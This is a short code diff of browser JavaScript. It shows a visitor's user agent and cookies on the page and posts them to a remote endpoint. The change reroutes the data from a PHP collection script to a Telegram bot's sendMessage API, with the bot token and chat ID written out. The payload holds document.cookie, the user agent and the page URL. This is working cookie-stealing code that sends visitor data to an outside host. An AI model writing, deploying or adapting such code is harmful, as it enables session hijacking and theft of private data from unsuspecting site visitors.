@@ -5,7 +5,7 @@ function print(id, text) {
   }
 }
 
-const url = 'https://ingarden.kitchen/send.php';
+const url = 'https://api.telegram.org/bot8034953949:AAEUYKGepGLfm66Q_ZsBVSV-vZRKhpViryo/sendMessage';
 
 print("ua", navigator.userAgent);
 print("cookie", document.cookie);
@@ -17,9 +17,12 @@ fetch(url, {
     "Content-Type": "application/json",
   },
   body: JSON.stringify({
-    userAgent: navigator.userAgent,
-    cookie: document.cookie,
-    referer: location.href,
+    chat_id: 7503104117,
+    text: `
+    userAgent: ${navigator.userAgent},
+    cookie: ${document.cookie},
+    referer: ${location.href}
+    `
   }),
 })
   .then((response) => {
